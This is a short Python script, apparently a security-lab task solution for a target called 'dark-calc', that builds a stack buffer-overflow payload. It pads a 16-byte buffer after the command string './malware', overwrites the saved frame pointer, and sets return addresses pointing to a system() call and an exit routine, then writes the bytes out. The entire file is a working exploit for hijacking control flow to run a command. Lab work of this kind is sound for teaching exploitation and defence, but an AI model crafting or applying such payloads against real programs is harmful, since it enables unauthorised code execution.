#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys
import struct

payload = b""

CMD = b"./malware"                  

SAVED_RBP = 0x721000800FE8         
SYSTEM_CALL = 0x401A6B              
EXIT_ZERO = 0x4019B9                

BUFSZ = 16                          

payload = CMD + b"\x00"
payload += b"A" * (BUFSZ - len(payload))      
payload += struct.pack("<Q", SAVED_RBP)       
payload += struct.pack("<Q", SYSTEM_CALL)     
payload += struct.pack("<Q", EXIT_ZERO)     

sys.stdout.buffer.write(payload)